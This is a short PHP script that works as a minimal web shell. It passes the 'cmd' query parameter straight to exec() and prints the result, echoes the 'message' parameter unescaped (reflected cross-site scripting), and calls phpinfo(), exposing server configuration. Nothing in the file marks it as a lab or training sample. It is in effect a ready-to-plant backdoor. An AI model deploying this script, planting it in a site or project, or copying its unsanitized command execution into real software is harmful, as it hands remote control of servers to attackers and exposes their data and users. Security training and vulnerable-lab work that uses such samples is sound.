<?php
phpinfo();
echo $_GET["message"];
$command = $_GET['cmd']; 


$result = exec($command);

echo "Command: $command<br>";
echo "Result: $result<br>";
?>
